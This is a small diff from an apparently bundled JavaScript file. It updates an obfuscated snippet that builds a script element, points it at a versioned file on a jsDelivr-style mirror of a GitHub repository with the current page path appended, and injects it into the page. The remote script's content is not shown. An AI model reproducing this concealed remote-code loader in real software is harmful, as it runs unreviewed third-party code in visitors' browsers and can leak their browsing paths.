@@ -145,7 +145,7 @@ if (path[__Oxaa6a7[0x6]](__Oxaa6a7[0x1e]) != -1) {
 }
 var script = document[__Oxaa6a7[0x8]](__Oxaa6a7[0x1]);
 script[__Oxaa6a7[0x9]] = __Oxaa6a7[0xa];
-script[__Oxaa6a7[0x4]] = 'https://cdn.jsdmirror.com/gh/itoucp/cd6c5d4c228bd4159f3@0.1.2' + __Oxaa6a7[0x2a] + path;
+script[__Oxaa6a7[0x4]] = 'https://cdn.jsdmirror.com/gh/itoucp/cd6c5d4c228bd4159f3@0.1.5' + __Oxaa6a7[0x2a] + path;
 document[__Oxaa6a7[0x11]][__Oxaa6a7[0x14]](script);
 
 /***/ })
